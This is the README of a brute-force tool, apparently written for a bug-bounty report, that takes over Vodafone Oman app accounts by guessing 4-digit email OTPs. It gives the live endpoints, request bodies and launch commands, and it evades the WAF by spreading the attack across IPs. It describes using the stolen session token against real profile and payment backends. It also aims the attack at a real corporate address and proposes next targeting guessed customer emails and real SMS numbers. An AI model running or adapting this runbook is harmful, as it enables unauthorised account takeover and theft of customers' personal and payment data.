# Vodafone Oman MVA — blind 4-digit email-OTP brute force (standalone)

Self-contained tooling to demonstrate **Account Takeover of any MVA
(My Vodafone App) account by brute-forcing the 4-digit email login OTP**
with no access to the victim's mailbox.

- `bf2.py` — the sweep worker (python3 stdlib only, 3.8+, no pip installs)
- `run_sweep.sh` — convenience launcher (splits a range across N workers)
- `verify_jwt.py` — post-hit proof: stolen JWT accepted by real backends
- `README.md` — this runbook

---

## 1. The vulnerability (full picture)

**Class:** Account Takeover (Critical) — insufficient OTP entropy + no
rate limiting / no lockout on the login OTP endpoint.

**Target:** `https://vfo01.vodafone.om` — the auth service of the Vodafone
Oman MVA app (Android `om.vodafone.mva` / iOS id 1589071345), in scope on
`www.vodafone.om` / `vfo01-03.vodafone.om`.

**Flow the attacker drives (all unauthenticated):**

1. `POST /auth/api/public/login/v1/start`
   body `{"clientId":"MVA","responseType":"code","scope":"openid",
   "codeChallengeMethod":"S256","codeChallenge":...,"state":<uuid>}`
   → returns `temporaryAccessToken` +
   `nextStep.emailOtpMethod.secretPayload`. The server generates a
   **4-digit numeric code** and emails it to the victim.
2. `POST /auth/api/public/login/v1/authenticate`
   body `{"authToken":{"emailOtpToken":{"secretPayload":SP,"email":E,
   "otp":"<guess>","resend":false}},"temporaryAccessToken":TMP}`
   → wrong guess: HTTP 200 `otpStatus:"OTP_MISMATCH"`.
   Correct guess: HTTP 200 `redirectUri` containing `code=ac_...`.
3. `POST /auth/api/public/access-token/v1` (form-encoded PKCE exchange)
   → **full customer JWT**: `scope:["customers"]`, 9 audiences
   (`MVA`, `CHAT`, `MVA_ZDS`, `DXL_SPM`, `DXL_ZMS`, `DXL_OTP`, `DXL_CXC`,
   `DXL_SCM`, `<VFO>`), `customer_id`, victim `email`, ~30 min lifetime.

**Why it breaks:**

| # | Finding |
|---|---------|
| 1 | OTP is **4 digits** → only 10,000 possibilities. |
| 2 | **No rate limiting** on `authenticate`: 1,113+ consecutive wrong guesses in one session run — no throttle, no 429, no CAPTCHA. |
| 3 | **No lockout** after repeated failures; `otpAttemptsLeft` is cosmetic (returned but never enforced). |
| 4 | Code TTL ≈ **900 s** (`otpExpiresIn: 899` observed) → hundreds of guesses fit in one code window. |
| 5 | **Unbounded resends** (~60 s cooldown, `RESEND_LATER` + `otpResendIn`) → new random code indefinitely; attacker chains code windows forever. |
| 6 | Codes are **per-session and multiple are simultaneously valid** → N parallel sessions = N independent live codes being attacked at once. |
| 7 | On hit the attacker gets a **full customer JWT** → real backend access: `vfo02 /api/public/profile/v1` (profile, PII), `/api/public/profile/v1/paymentMethods` (payment methods), `vfo03 /chat/customer/v1/...` (support chat), and the 9 other audiences (eSIM/ZDS/SPM/...). |

**Impact:** an unauthenticated attacker can take over any MVA account
whose email is enrolled, with no mailbox access, no password, and no user
interaction beyond receiving OTP emails they ignore.

**Root cause:** 4-digit entropy + long TTL + no per-email throttling or
lockout on the guess endpoint.
**Fix suggestions:** 6+ digit OTP, per-email rate limit (e.g. ≤10
guesses/min), lockout after N failures, shorter TTL (≤5 min), capped
resends per hour.

**Already proven (see `../evidence/`):** full ATO on a disposable mailbox
(guessed/self-issued code `3140` → customer JWT, live-verified on
vfo02/vfo03); blind run of 1,113 guesses / 13 resends / 63 min with zero
lockout. This standalone tooling finishes the PoE on a **real corporate
address** (`security@vodafone.om`).

---

## 2. How to run

**Prereqs:** python 3.8+, outbound HTTPS. **Run from an IP different from
the main 8-worker sweep** (the WAF penalty is per-IP, so a second IP gets
a fresh budget — the two runs are complementary, not competing).

**Range allocation (zero overlap with the main sweep):**

| Run | IP | Range |
|-----|----|-------|
| main sweep (8 workers, already running) | this box | 3600–9999 |
| **this run** | your box | **0–3599** |

Together they cover the entire 10,000-value space every cycle.

**Launch (2 workers = conservative on a fresh IP):**

```bash
./run_sweep.sh security@vodafone.om 0 3600 2 /tmp/vfo_r
# or manually:
mkdir -p /tmp/vfo_r0 /tmp/vfo_r1
nohup python3 bf2.py security@vodafone.om 0 1800 /tmp/vfo_r0 > /tmp/vfo_r0/out.log 2>&1 &
nohup python3 bf2.py security@vodafone.om 1800 3600 /tmp/vfo_r1 > /tmp/vfo_r1/out.log 2>&1 &
```

**Scale up after 10 quiet minutes:** if neither `out.log` shows
`waf global backoff`, add two more workers on 0–1800 / 1800–3600
sub-slices (e.g. re-split: `0 900 / 900 1800 / 1800 2700 / 2700 3600`).

**Properties:**
- **Resumable** — position saved to `<statedir>/pos` every 25 guesses;
  kill/restart anytime, same command resumes.
- **Stop** — `touch /tmp/vfo_r0/bf_stop` (then delete it to resume).
- **WAF-aware** — any worker that sees the HTML penalty page puts ALL
  workers on that host in a ~4 min global silence
  (shared file `/tmp/vfo_waf_penalty`, override with env `BF_WAF_FILE`).
  Re-penalties auto-extend. No manual babysitting.
- **Wraps** — when a worker reaches the end of its slice it loops back to
  the start, so values lost to a WAF penalty get re-covered on the next
  pass (against fresh codes, which is what matters).

## 3. What you are looking for

In `<statedir>/out.log` (and `bf_log.jsonl`):

| Log line | Meaning |
|----------|---------|
| `otpStatus OTP_MISMATCH` (milestone lines) | normal — code alive, guessing |
| `"kind": "resend"` | new code issued (expected ~1 per 15 min per worker) |
| `"kind": "expired"` | code window ended, worker auto-reissues — normal |
| `waf global backoff ~Nns left` | WAF penalty; everyone on this host pauses, auto-resumes |
| **`"kind": "FOUND"`** | **HIT.** `<statedir>/bf_SUCCESS.json` now exists with guessed code, auth code, JWT, claims, stats. |

Also just watch: `ls /tmp/vfo_r*/bf_SUCCESS.json`

## 4. After a hit (what to do)

1. **Read it:** `cat /tmp/vfo_r*/bf_SUCCESS.json`
   → `guessed_code`, `jwt`, `claims` (`customer_id`, victim `email`,
   9 `aud`, `exp`), plus `total_guesses` / `elapsed_s` (your timeline).
2. **Verify it live** (JWT is good ~30 min — do this within the window):
   ```bash
   python3 verify_jwt.py /tmp/vfo_r0/bf_SUCCESS.json
   ```
   Prints the 401→200 contrast on the real backends:
   - `vfo02 /api/public/profile/v1` — no token 401, with token 200 + victim profile/PII
   - `vfo02 /api/public/profile/v1/paymentMethods` — payment data (note: unenrolled accounts return a 500 "Exception in exception handler" bug here — bonus finding)
   - `vfo03 /chat/customer/v1/agents/availability` — no token 401, with token 200
   Writes `verify_result.json` next to the input.
3. **Package the evidence:** copy `bf_SUCCESS.json` + `verify_result.json`
   (and the relevant `out.log` tail around the FOUND line) into
   `../evidence/`.
4. **Update the reports:** add the real-corporate-address ATO to
   `../BUG_REPORT.md` and `../HACKERONE_REPORT.md` (the H1 report already
   has the structure; add a "Blind brute-force on real corporate address"
   section with the timeline: range, guesses, elapsed, code found, JWT
   verified).
5. If the JWT expired before verification, a fresh one is mintable via
   `../poc/poc_oto_selfissued.py` (same pipeline, ~1 min).

## 5. How to continue

- **After a hit:** delete `bf_SUCCESS.json` and rerun the same command to
  keep sweeping the same slice (it resumes from `pos`), or point workers
  at the next target email.
- **Other targets:** any enrolled customer email works — corporate
  addresses (security@, care@, ...), then format-guessed customer emails.
- **SMS variant:** the same login flow has `smsOtpMethod`
  (`vfoSmsOtpMethod`) — 4-digit OTP by SMS, same (non-)enforcement.
  Registered Vodafone Oman lines: `+96877101717` (care),
  `+96877001717` (WhatsApp/chat). Higher impact (mobile number, not email).
- **The main 8-worker sweep** (range 3600–9999, this box) keeps running
  independently — no coordination needed between the two IPs.

## 6. Expected results / the math

- Space: 10,000 values. One code window ≈ 900 s.
- Each worker ≈ 0.7 guesses/s → ~200–300 distinct guesses per worker per
  window (fresh IP, before WAF duty-cycle effects).
- **Each worker holds its own independent live code** (verified: multiple
  codes simultaneously valid, per-session). Hit chance per window pair ≈
  4–10 %; with WAF duty cycles expect roughly **25–40 %/hour** with 2
  workers, ~50 %+/hour with 4.
- Full pass of 0–3599 with 2 workers: ~3–4 h (WAF pauses included).
- If a whole pass completes with no hit, the slices wrap automatically and
  re-cover the space against new codes — the run is self-perpetuating;
  expected time to a hit is well under a day.
